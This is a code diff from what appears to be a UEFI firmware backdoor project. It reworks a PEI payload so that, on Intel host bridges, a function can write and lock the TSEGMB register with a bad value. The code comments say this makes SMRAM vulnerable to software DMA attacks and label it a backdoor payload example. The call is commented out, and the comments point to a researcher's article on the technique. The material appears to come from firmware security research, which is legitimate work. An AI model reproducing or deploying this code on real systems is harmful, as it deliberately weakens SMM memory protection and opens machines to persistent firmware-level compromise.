@@ -65,34 +65,13 @@ EFI_STATUS PrintHobInfo(EFI_PEI_SERVICES **ppPeiServices)
     return Status;
 }
 //--------------------------------------------------------------------------------------
-#define PCI_ADDR(_bus_, _dev_, _func_, _addr_)                           \
-                                                                         \
-    (unsigned int)(((_bus_) << 16) | ((_dev_) << 11) | ((_func_) << 8) | \
-                   ((_addr_) & 0xfc) | ((unsigned int)0x80000000))
-
 EFI_STATUS TrashTSEGMB(VOID)
 {
-    UINT32 val = 0;
-    UINT16 vid = 0, did = 0;
+    // TSEGMB address (bus 0, device, 0, function 0, offset 0xB8)
+    __outdword(0xcf8, PCI_ADDR(0, 0, 0, 0xb8));
 
-    // host bridge address
-    __outdword(0xcf8, PCI_ADDR(0, 0, 0, 0));
-
-    val = __indword(0xcfc);
-
-    vid = (UINT16)((val >> 0) & 0xffff),
-    did = (UINT16)((val >> 16) & 0xffff);
-
-    DbgMsg(__FILE__, __LINE__, "Host bridge VID:DID is %.4x:%.4x\n", vid, did);
-
-    if (vid == 0x8086)
-    {
-        // TSEGMB address
-        __outdword(0xcf8, PCI_ADDR(0, 0, 0, 0xb8));
-
-        // write and lock TSEGMB with incorrect value
-        __outdword(0xcfc, 0x00000001);
-    }
+    // write and lock TSEGMB with incorrect value
+    __outdword(0xcfc, 0x00000001);
 
     return EFI_SUCCESS;
 }
@@ -116,6 +95,9 @@ EFI_STATUS Payload(
 {
     EFI_STATUS Status = EFI_SUCCESS;
 
+    UINT32 val = 0;
+    UINT16 vid = 0, did = 0;    
+
     if (ppPeiServices)
     {
         // install notify that will be called after the memory init
@@ -125,8 +107,30 @@ EFI_STATUS Payload(
         }   
     }    
 
-    // some useful stuff as example
-    /* TrashTSEGMB(); */
+    // host bridge VID/PID address
+    __outdword(0xcf8, PCI_ADDR(0, 0, 0, 0));
+
+    val = __indword(0xcfc);
+
+    vid = (UINT16)((val >> 0) & 0xffff),
+    did = (UINT16)((val >> 16) & 0xffff);
+
+    DbgMsg(__FILE__, __LINE__, "Host bridge VID:DID is %.4x:%.4x\n", vid, did);
+
+    if (vid == 0x8086)
+    {
+        /* 
+            Some useful stuff as backdoor payload example.
+
+            Uncomment this function call to lock TSEGMB register with incorrect value,
+            it will make SMRAM region vulnerable to software DMA attacks. You can
+            read more details about such attacks in my "Breaking UEFI security with 
+            software DMA attacks" article:
+
+            http://blog.cr4.sh/2015/09/breaking-uefi-security-with-software.html
+        */
+        // TrashTSEGMB();
+    }    
 
     return EFI_SUCCESS;   
 }
